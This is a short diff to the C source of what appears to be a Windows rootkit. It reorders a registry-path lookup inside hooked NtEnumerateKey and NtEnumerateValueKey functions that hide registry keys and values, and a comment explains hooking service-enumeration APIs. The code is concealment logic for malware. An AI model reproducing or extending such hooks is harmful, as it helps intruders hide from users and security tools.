@@ -63,7 +63,7 @@ VOID InitializeHooks()
 
 	// Usually, ntdll.dll should be the only DLL to hook.
 	// Unfortunately, the actual enumeration of services happens in services.exe - a protected process that cannot be injected.
-	// Tje EnumService* methods from advapi32.dll access services.exe through RPC.
+	// The EnumService* methods from advapi32.dll access services.exe through RPC.
 	// There is no longer one single syscall wrapper function to hook, but multiple higher level functions.
 
 	TlsNtEnumerateKeyCacheKey = TlsAlloc();
@@ -472,8 +472,10 @@ static NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE key, ULONG index, NT_KEY_INFOR
 		correctedIndex = cacheCorrectedIndex + 1;
 	}
 
-	BYTE buffer[1024];
 	WCHAR keyPath[1000];
+	if (!GetRegistryKeyName(key, keyPath, 1000)) keyPath[0] = L'\0';
+
+	BYTE buffer[1024];
 	WCHAR fullPath[1000];
 	PNT_KEY_BASIC_INFORMATION basicInformation = (PNT_KEY_BASIC_INFORMATION)buffer;
 
@@ -492,7 +494,7 @@ static NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE key, ULONG index, NT_KEY_INFOR
 		{
 			hidden = TRUE;
 		}
-		else if (GetRegistryKeyName(key, keyPath, 1000))
+		else if (lstrlenW(keyPath) > 0)
 		{
 			StrCpyW(fullPath, keyPath);
 			StrCatW(fullPath, L"\\");
@@ -555,8 +557,10 @@ static NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_
 		correctedIndex = cacheCorrectedIndex + 1;
 	}
 
-	BYTE buffer[1024];
 	WCHAR keyPath[1000];
+	if (!GetRegistryKeyName(key, keyPath, 1000)) keyPath[0] = L'\0';
+
+	BYTE buffer[1024];
 	WCHAR fullPath[1000];
 	PNT_KEY_VALUE_BASIC_INFORMATION basicInformation = (PNT_KEY_VALUE_BASIC_INFORMATION)buffer;
 
@@ -575,7 +579,7 @@ static NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_
 		{
 			hidden = TRUE;
 		}
-		else if (GetRegistryKeyName(key, keyPath, 1000))
+		else if (lstrlenW(keyPath) > 0)
 		{
 			StrCpyW(fullPath, keyPath);
 			StrCatW(fullPath, L"\\");
